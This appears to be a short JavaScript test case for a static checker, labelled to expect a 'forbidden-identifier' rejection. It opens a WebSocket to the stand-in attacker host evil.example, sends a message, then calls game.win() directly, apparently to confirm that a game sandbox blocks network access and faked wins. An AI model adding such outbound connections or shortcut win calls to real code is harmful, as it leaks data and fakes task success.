// expect: static forbidden-identifier
const socket = new WebSocket('wss://evil.example/');
socket.onopen = () => socket.send('hello');
game.win();
